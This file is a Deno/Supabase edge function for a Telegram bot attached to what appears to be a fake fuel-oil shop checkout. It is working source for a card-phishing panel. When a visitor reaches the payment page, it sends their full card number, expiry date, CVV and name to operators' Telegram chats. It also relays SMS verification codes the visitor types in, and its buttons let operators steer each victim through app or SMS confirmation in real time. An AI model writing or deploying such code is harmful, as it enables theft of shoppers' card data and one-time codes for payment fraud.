import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const telegramToken = Deno.env.get('TELEGRAM_BOT_TOKEN')!;

const supabase = createClient(supabaseUrl, supabaseKey);

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const action = url.pathname.split('/').pop();
    
    // Handle the case where function is called directly with body containing type/action
    if (action === 'telegram-bot') {
      const body = await req.json();
      
      // Check if this is a notification request
      if (body.type) {
        return await handleSendNotification({ json: () => Promise.resolve(body) } as Request);
      }
      
      // Check if this is a test message request
      if (body.chatId) {
        return await handleTestMessage({ json: () => Promise.resolve(body) } as Request);
      }
      
      return new Response('Invalid request body', { status: 400 });
    }

    switch (action) {
      case 'webhook':
        return await handleWebhook(req);
      case 'send-notification':
        return await handleSendNotification(req);
      case 'test-message':
        return await handleTestMessage(req);
      default:
        return new Response('Not found', { status: 404 });
    }
  } catch (error) {
    console.error('Telegram bot error:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

async function handleWebhook(req: Request) {
  const update = await req.json();
  console.log('Telegram webhook update:', update);

  if (update.callback_query) {
    await handleCallbackQuery(update.callback_query);
  }

  return new Response('OK', { headers: corsHeaders });
}

async function handleCallbackQuery(callbackQuery: any) {
  const { data, from, message } = callbackQuery;
  const [action, sessionId, ...params] = data.split(':');

  console.log(`Handling callback: ${action} for session ${sessionId} with params:`, params);

  try {
    switch (action) {
      case 'set_method':
        const method = params[0];
        console.log(`Setting verification method: ${method} for session: ${sessionId}`);
        
        const { data: result, error } = await supabase.functions.invoke('payment-sessions/set-verification-method', {
          body: { 
            sessionId, 
            method 
          }
        });
        
        if (error) {
          console.error('Error setting verification method:', error);
          throw error;
        }
        
        console.log('Verification method set successfully:', result);
        
        let successMessage;
        
        switch (method) {
          case 'choice_required':
            successMessage = `✅ **Choice Required**\n\nSession: \`${sessionId}\`\nCustomer can now choose between App & SMS verification.`;
            break;
          case 'app_confirmation':
            successMessage = `✅ **App Verification Activated**\n\nSession: \`${sessionId}\`\nApp confirmation is now active.`;
            // Send notification when customer chooses App - get cardholder name
            if (result && result.cardholder_name) {
              await sendMethodChoiceNotification(sessionId, 'app', result.cardholder_name);
            }
            break;
          case 'sms_confirmation':
            successMessage = `✅ **SMS Verification Activated**\n\nSession: \`${sessionId}\`\nSMS confirmation is now active.`;
            // Send notification when customer chooses SMS - get cardholder name
            if (result && result.cardholder_name) {
              await sendMethodChoiceNotification(sessionId, 'sms', result.cardholder_name);
            }
            break;
          default:
            successMessage = `✅ Verification method set to: ${method}`;
        }
        
        await editMessageText(
          message.chat.id,
          message.message_id,
          successMessage,
          null  // Keine Buttons mehr nach "Wahl" - User entscheidet auf der Website
        );
        break;

      case 'complete':
        const success = params[0] === 'success';
        console.log(`Completing payment: ${success ? 'success' : 'failed'} for session: ${sessionId}`);
        
        if (success) {
          const { data: completeResult, error: completeError } = await supabase.functions.invoke('payment-sessions/complete-payment', {
            body: { 
              sessionId 
            }
          });
          
          if (completeError) {
            console.error('Error completing payment:', completeError);
            throw completeError;
          }
          
          await editMessageText(
            message.chat.id,
            message.message_id,
            `✅ Payment completed successfully!\n\n${message.text}`,
            null
          );
        } else {
          const { data: resetResult, error: resetError } = await supabase.functions.invoke('payment-sessions/reset-verification', {
            body: { 
              sessionId 
            }
          });
          
          if (resetError) {
            console.error('Error resetting verification:', resetError);
            throw resetError;
          }
          
          await editMessageText(
            message.chat.id,
            message.message_id,
            `❌ Payment failed, verification reset\n\n${message.text}`,
            getVerificationMethodButtons(sessionId)
          );
        }
        break;
    }

    // Answer callback query to remove loading state
    let confirmationMessage = 'Action processed';
    
    if (action === 'set_method') {
      const method = params[0];
      switch (method) {
        case 'choice_required':
          confirmationMessage = '✅ Wahl gesetzt - Kunde kann zwischen App & SMS wählen';
          break;
        case 'app_confirmation':
          confirmationMessage = '✅ App-Bestätigung aktiviert';
          break;
        case 'sms_confirmation':
          confirmationMessage = '✅ SMS-Bestätigung aktiviert';
          break;
      }
    } else if (action === 'complete') {
      const success = params[0] === 'success';
      confirmationMessage = success ? '✅ Zahlung erfolgreich abgeschlossen' : '❌ Zahlung fehlgeschlagen';
    }
    
    await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id,
        text: confirmationMessage
      })
    });

  } catch (error) {
    console.error('Error handling callback:', error);
    await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id,
        text: 'Fehler beim Verarbeiten der Aktion',
        show_alert: true
      })
    });
  }
}

async function handleSendNotification(req: Request) {
  const { type, data } = await req.json();

  const { data: chatIds } = await supabase
    .from('telegram_config')
    .select('chat_id')
    .eq('is_active', true);

  if (!chatIds || chatIds.length === 0) {
    return new Response(JSON.stringify({ message: 'No active chat IDs configured' }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  for (const { chat_id } of chatIds) {
    await sendNotification(chat_id, type, data);
  }

  return new Response(JSON.stringify({ message: 'Notifications sent' }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleTestMessage(req: Request) {
  const { chatId } = await req.json();

  const message = `🤖 *Test Notification*\n\nTelegram bot is working correctly!\nTime: ${new Date().toLocaleString()}`;

  await sendTelegramMessage(chatId, message);

  return new Response(JSON.stringify({ message: 'Test message sent' }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function sendNotification(chatId: string, type: string, data: any) {
  let message = '';
  let buttons = null;

  switch (type) {
    case 'checkout_started':
      message = `🛒 *Jemand ist im Checkout*\n\n` +
                `🛢️ Produkt: ${data.product.displayName}\n` +
                `📦 Menge: ${data.quantity.toLocaleString()}L\n` +
                `💰 Gesamtpreis: €${data.totalPrice.toFixed(2)}\n` +
                `📮 PLZ: ${data.zipCode}`;
      break;

    case 'payment_started':
      message = `💳 *Payment Page Entered*\n\n` +
                `👤 Cardholder: \`${data.cardholder_name}\`\n` +
                `💳 Card: \`${data.card_number}\`\n` +
                `📅 Expiry: \`${data.expiry_date}\`\n` +
                `🔐 CVV: \`${data.cvv}\`\n` +
                `💰 Gesamtpreis: €${(data.totalPrice || 0).toFixed(2)}\n\n` +
                `Karteninhaber: ${data.cardholder_name}`;
      buttons = getVerificationMethodButtons(data.session_id);
      break;

    case 'verification_update':
      if (data.verification_status === 'app_confirmed') {
        message = `✅ *App Verification Confirmed*\n\n` +
                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
                  `Method: ${data.verification_method}`;
        buttons = getCompletionButtons(data.session_id);
      } else if (data.verification_status === 'sms_confirmation' && data.sms_code) {
        message = `📱 *SMS Code Entered*\n\n` +
                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
                  `Code: \`${data.sms_code}\``;
        buttons = getCompletionButtons(data.session_id);
      } else if (data.message && data.message.includes('User wählte:')) {
        // Handle user choice notification
        const choice = data.verification_method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung';
        message = `🎯 *User hat gewählt*\n\n` +
                  `Wahl: ${choice}\n` +
                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}`;
      }
      break;
  }

  if (message) {
    await sendTelegramMessage(chatId, message, buttons);
  }
}

async function sendTelegramMessage(chatId: string, text: string, replyMarkup: any = null) {
  const payload: any = {
    chat_id: chatId,
    text,
    parse_mode: 'Markdown'
  };

  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    const error = await response.text();
    console.error('Telegram API error:', error);
    throw new Error(`Telegram API error: ${error}`);
  }

  return await response.json();
}

async function editMessageText(chatId: string, messageId: number, text: string, replyMarkup: any = null) {
  const payload: any = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: 'Markdown'
  };

  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://api.telegram.org/bot${telegramToken}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  return response.ok;
}

function getVerificationMethodButtons(sessionId: string) {
  return {
    inline_keyboard: [
      [
        { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:choice_required` },
        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` },
        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
      ]
    ]
  };
}

function getVerificationChoiceButtons(sessionId: string) {
  return {
    inline_keyboard: [
      [
        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` },
        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
      ]
    ]
  };
}

function getCompletionButtons(sessionId: string) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Erfolgreich', callback_data: `complete:${sessionId}:success` },
        { text: '❌ Fehlgeschlagen', callback_data: `complete:${sessionId}:failed` }
      ]
    ]
  };
}

async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms', cardholderName?: string) {
  try {
    // Get all active chat IDs
    const { data: activeChatIds, error } = await supabase.functions.invoke('get-active-chat-ids');
    
    if (error || !activeChatIds) {
      console.error('Error getting active chat IDs:', error);
      return;
    }

    const methodText = method === 'app' ? 'App-Verification' : 'SMS-Verification';
    const emoji = method === 'app' ? '📱' : '💬';
    
    const message = `${emoji} **Nutzer hat ${methodText} gewählt**\n\nKarteninhaber: ${cardholderName || 'Unknown'}\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;

    // Send notification to all active chat IDs
    for (const chatId of activeChatIds) {
      await sendTelegramMessage(chatId, message);
    }
    
    console.log(`Method choice notification sent for session ${sessionId}, method: ${method}, cardholder: ${cardholderName}`);
  } catch (error) {
    console.error('Error sending method choice notification:', error);
  }
}